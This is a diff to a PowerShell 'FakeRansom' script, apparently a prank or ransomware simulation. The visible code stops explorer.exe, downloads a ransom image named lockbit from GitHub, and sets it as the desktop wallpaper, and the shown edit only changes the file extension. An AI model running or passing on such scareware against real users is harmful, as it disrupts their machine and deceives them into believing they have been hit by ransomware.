@@ -6,7 +6,7 @@ Get-Process "explorer"| Stop-Process
 $url = "https://github.com/Kbl34/FakeRansom/blob/main/ransom.png"
 
 
-Invoke-WebRequest $url -OutFile C:\Users\Public\lockbit.jpg
+Invoke-WebRequest $url -OutFile C:\Users\Public\lockbit.png
 
 
 $setwallpapersrc = @"
@@ -27,7 +27,7 @@ public class Wallpaper
 "@
 Add-Type -TypeDefinition $setwallpapersrc
 
-[Wallpaper]::SetWallpaper("C:\Users\Public\lockbit.jpg")
+[Wallpaper]::SetWallpaper("C:\Users\Public\lockbit.png")
 
 
 #Pop Up Message
